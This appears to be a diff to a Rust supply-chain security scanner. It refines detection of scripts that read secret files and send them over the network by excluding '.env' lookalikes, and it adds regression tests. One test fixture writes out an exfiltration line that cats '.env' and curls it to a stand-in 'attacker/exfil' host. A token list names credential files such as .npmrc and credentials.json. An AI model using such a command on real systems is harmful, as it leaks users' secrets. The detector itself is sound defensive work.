@@ -4,6 +4,7 @@ use crate::findings::{
     ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
 };
 
+use super::dotenv::references_dotenv_file;
 use super::match_helpers::original_match_str;
 use super::patterns::REMOTE_BINARY_PATTERNS;
 
@@ -43,8 +44,16 @@ pub(crate) fn detect_remote_binary_downloads(
 /// false matches in long scripts.
 const TAINT_WINDOW_LINES: usize = 15;
 
+/// Substring-matched secret-file tokens.
+///
+/// Bare `.env` is **deliberately excluded** here because the substring matches
+/// `.envrc`, `.envelope`, `.environments/...`, and any identifier whose
+/// lowercased form happens to contain `.env`. Genuine dotenv references are
+/// detected via [`references_dotenv_file`] in
+/// [`line_reads_secret_file`], which applies word-boundary checks. The
+/// remaining tokens here are unique enough that a substring match does not
+/// collide with benign names in practice.
 const SECRET_FILE_TOKENS: &[&str] = &[
-    ".env",
     ".zsh_history",
     ".bash_history",
     "cookies.json",
@@ -54,6 +63,14 @@ const SECRET_FILE_TOKENS: &[&str] = &[
     "credentials.json",
     ".npmrc",
 ];
+
+/// `true` when `lower` (an already-lowercased line) reads a secret-bearing
+/// file. Combines the substring tokens in [`SECRET_FILE_TOKENS`] with the
+/// word-boundary dotenv check from [`references_dotenv_file`] so that
+/// `.envrc` lookalikes do not produce taint findings.
+fn line_reads_secret_file(lower: &str) -> bool {
+    SECRET_FILE_TOKENS.iter().any(|t| lower.contains(t)) || references_dotenv_file(lower)
+}
 
 const READ_VERBS: &[&str] = &[
     "cat ",
@@ -106,7 +123,7 @@ pub(crate) fn detect_file_secret_to_network_flow(
         .enumerate()
         .filter_map(|(idx, line)| {
             let has_read = READ_VERBS.iter().any(|v| line.contains(v));
-            let has_secret = SECRET_FILE_TOKENS.iter().any(|t| line.contains(t));
+            let has_secret = line_reads_secret_file(line);
             if has_read && has_secret {
                 Some(idx)
             } else {
@@ -215,6 +232,53 @@ mod tests {
         assert!(
             findings.is_empty(),
             "should respect window; got {findings:?}"
+        );
+    }
+
+    /// # Contract (negative)
+    ///
+    /// `.envrc` (direnv) and `.envelope` are NOT dotenv files, so a benign
+    /// `cat .envrc && curl ...` script MUST NOT escalate to a Critical
+    /// taint finding. Pre-fix `SECRET_FILE_TOKENS` contained the bare
+    /// substring `.env`, so any line mentioning `.envrc` plus a network
+    /// verb within 15 lines fired `SCRIPT_FILE_SECRET_TO_NETWORK_FLOW`,
+    /// pushing benign packages to Malicious. The fix routes secret-file
+    /// detection through `references_dotenv_file`, which applies
+    /// word-boundary semantics to `.env`.
+    #[test]
+    fn detect_file_secret_to_network_flow_ignores_envrc_lookalikes() {
+        for sample in [
+            "source .envrc\nexport ENV=dev\ncurl https://example.com/healthz\n",
+            "cat .envelope >> log\ncurl https://example.com/ok\n",
+            "value=$(cat .environments/prod.conf)\ncurl https://example.com/ok\n",
+        ] {
+            let lower = sample.to_ascii_lowercase();
+            let findings = detect_file_secret_to_network_flow(&lower, "sh", "/tmp/x.sh");
+            assert!(
+                findings.is_empty(),
+                "must not fire on lookalike: {sample:?} → {findings:?}"
+            );
+        }
+    }
+
+    /// # Contract (positive)
+    ///
+    /// Genuine `.env` reads paired with network egress MUST still fire
+    /// after the dotenv-lookalike filter is in place. This pins the
+    /// positive direction so a future tightening of `references_dotenv_file`
+    /// cannot silently break the taint detector. The detector requires the
+    /// read-verb and the secret-file token on the *same* line, so the
+    /// sample puts `cat ".env"` on one line.
+    #[test]
+    fn detect_file_secret_to_network_flow_fires_on_quoted_dotenv() {
+        let sample = "value=$(cat \".env\")\ncurl https://attacker/exfil -d \"$value\"\n";
+        let lower = sample.to_ascii_lowercase();
+        let findings = detect_file_secret_to_network_flow(&lower, "sh", "/tmp/x.sh");
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "SCRIPT_FILE_SECRET_TO_NETWORK_FLOW"),
+            "expected fire on genuine dotenv: {sample:?} → {findings:?}"
         );
     }
 }
